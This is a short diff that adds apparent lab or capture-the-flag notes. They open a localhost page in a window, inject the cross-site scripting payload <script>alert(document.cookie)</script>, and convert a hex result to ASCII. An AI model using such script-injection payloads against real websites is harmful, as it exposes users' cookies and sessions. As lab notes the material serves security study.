@@ -1,0 +1,7 @@
+Run this script:
+<script>
+  window.open('http://localhost:5005/', 'iframe');
+</script>
+
+Type: <script>alert(document.cookie)</script>
+Refresh page and convert hex to ascii
